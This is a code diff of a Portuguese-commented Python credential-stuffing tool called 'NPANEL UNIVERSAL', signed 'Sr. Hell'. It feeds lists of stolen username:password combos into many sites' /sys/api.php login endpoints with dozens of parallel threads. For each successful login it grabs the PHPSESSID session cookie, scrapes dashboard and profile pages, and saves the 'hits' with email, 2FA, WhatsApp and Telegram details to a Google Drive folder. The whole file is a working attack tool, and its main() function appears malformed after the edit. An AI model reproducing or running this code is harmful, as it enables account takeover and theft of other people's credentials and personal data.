@@ -1,4 +1,3 @@
-import configparser
 import requests
 import re
 import sys
@@ -10,30 +9,36 @@ import queue
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from colorama import Fore, Style
 
-# Load configuration
-config = configparser.ConfigParser()
-config.read('config.ini')
+# Configurações globais
+THREADS_PER_SITE = 5  # 5 threads por site
+SIMULTANEOUS_SITES = 35  # 5 sites simultâneos
 
-# Get configuration values
-COMBO_DIR = config['Paths']['combo_dir']
-SITE_FILE = config['Paths']['site_file']
-OUTPUT_DIR = config['Paths']['output_dir']
-THREADS_PER_SITE = config.getint('Threading', 'threads_per_site')
-SIMULTANEOUS_SITES = config.getint('Threading', 'processes_per_site')
-RETRIES = config.getint('Network', 'retries')
-DELAY = config.getint('Network', 'delay')
-
-# Rest of your configurations
+# Configuração para evitar warnings de SSL
 requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 logging.captureWarnings(True)
 NOME = 'NPANEL UNIVERSAL'
 
+if sys.platform.startswith('win'):
+    import ctypes
+    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
+else:
+    sys.stdout.write(f'\033]2;{NOME}\007')
+
+ascii_art = """\033[93m
+   _  _____  ___   _  ________     __  ___  __
+  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
+ /    / ___/ __ |/    / _// /__  / /_/ /    / 
+/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
+                                              
+"""
+
 def get_first_combo_file():
     try:
-        combo_files = [f for f in os.listdir(COMBO_DIR) if os.path.isfile(os.path.join(COMBO_DIR, f))]
+        combo_dir = "/content/drive/MyDrive/_Paineis/combo"
+        combo_files = [f for f in os.listdir(combo_dir) if os.path.isfile(os.path.join(combo_dir, f))]
         if combo_files:
-            return os.path.join(COMBO_DIR, combo_files[0])
+            return os.path.join(combo_dir, combo_files[0])
         return None
     except FileNotFoundError:
         print(f"{Fore.RED}Diretório de combo não encontrado!")
@@ -41,25 +46,50 @@ def get_first_combo_file():
 
 def read_sites():
     try:
-        with open(SITE_FILE, "r") as f:
+        with open("/content/drive/MyDrive/_Paineis/site.txt", "r") as f:
             return [site.strip() for site in f.readlines() if site.strip()]
     except FileNotFoundError:
         print(f"{Fore.RED}Arquivo site.txt não encontrado!")
         return []
 
-def handle_connection_error(func, *args, **kwargs):
-    for attempt in range(RETRIES):
+def handle_connection_error(func, *args, retries=3, delay=5, **kwargs):
+    for attempt in range(retries):
         try:
             return func(*args, **kwargs)
         except (requests.ConnectionError, requests.Timeout) as e:
-            print(f"{Fore.RED}Erro de conexão: {e}. Tentativa {attempt + 1} de {RETRIES}...")
-            time.sleep(DELAY)
+            print(f"{Fore.RED}Erro de conexão: {e}. Tentativa {attempt + 1} de {retries}...")
+            time.sleep(delay)
     return None
 
-def save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram):
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
+def login(nhost, user, password):
+    url = f"https://{nhost}/sys/api.php"
+    payload = {
+        "action": "login",
+        "username": user,
+        "password": password
+    }
+    response = handle_connection_error(requests.post, url, data=payload)
+    
+    if response and response.ok and "success\":true" in response.text:
+        cookies = response.cookies.get("PHPSESSID")
+        return cookies
+    return None
 
-    with open(f"{OUTPUT_DIR}/Sr.Hell@{nhost}.txt", "a") as f:
+def get_dashboard_data(nhost, cookies):
+    url = f"https://{nhost}/dashboard"
+    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
+    return response.text if response else None
+
+def get_profile_data(nhost, cookies):
+    url = f"https://{nhost}/profile"
+    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
+    return response.text if response else None
+
+def save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram):
+    base_path = "/content/drive/MyDrive/_Paineis/hits"
+    os.makedirs(base_path, exist_ok=True)
+
+    with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
         f.write(f"\n╼╾ Sr. Hell ╼╾\n")
         f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
         f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
@@ -69,7 +99,7 @@ def save_data(nhost, user, password, credits, email, registration_date, twofa, w
         f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
         f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")
 
-    with open(f"{OUTPUT_DIR}/Sr.Hell@COMBO(U&P).txt", "a") as f:
+    with open("/content/drive/MyDrive/_Paineis/hits/Sr.Hell@COMBO(U&P).txt", "a") as f:
         f.write(f"{user}:{password}\n")
 
 def print_valid_login(nhost, user, password, credits):
@@ -84,17 +114,17 @@ def print_valid_login(nhost, user, password, credits):
     print(Fore.GREEN + f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾" + Style.RESET_ALL)
 
 def worker(combo_queue, nhost):
-  while True:
-    try:
-      combo = combo_queue.get_nowait()
-      user, password = combo.strip().split(':')
-      thread_login(nhost, user, password)
-    except queue.Empty:
-      break
-    except ValueError:
-      continue
-    finally:
-      combo_queue.task_done()
+    while True:
+        try:
+            combo = combo_queue.get_nowait()
+            user, password = combo.strip().split(':')
+            thread_login(nhost, user, password)
+        except queue.Empty:
+            break
+        except ValueError:
+            continue
+        finally:
+            combo_queue.task_done()
 
 def process_site(nhost, combos_data):
     print(f"{Fore.CYAN}Iniciando verificação do site: {nhost}")
@@ -169,15 +199,7 @@ def manage_sites(sites, combos_data):
 
 def main():
     print(ascii_art)
-ascii_art = """\033[93m
-   _  _____  ___   _  ________     __  ___  __
-  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
- /    / ___/ __ |/    / _// /__  / /_/ /    / 
-/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
-                                              
-"""
-
-print(ascii_art)   
+    
     sites = read_sites()
     if not sites:
         print(f"{Fore.RED}Nenhum site encontrado para verificar!")
